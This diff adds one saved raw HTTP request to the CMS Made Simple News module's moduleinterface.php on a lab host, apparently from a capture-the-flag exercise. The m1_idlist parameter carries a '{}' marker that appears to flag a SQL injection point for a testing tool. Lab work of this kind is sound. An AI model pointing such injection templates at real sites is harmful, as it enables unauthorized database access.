@@ -1,0 +1,12 @@
+GET /writeup/moduleinterface.php?mact=News,m1_,default,0&m1_idlist={} HTTP/1.1
+Host: 10.10.10.138
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: CMSSESSID9d372ef93962=6jne2ec05ag2hmul5h4085ia26
+Upgrade-Insecure-Requests: 1
+DNT: 1
+Sec-GPC: 1
+
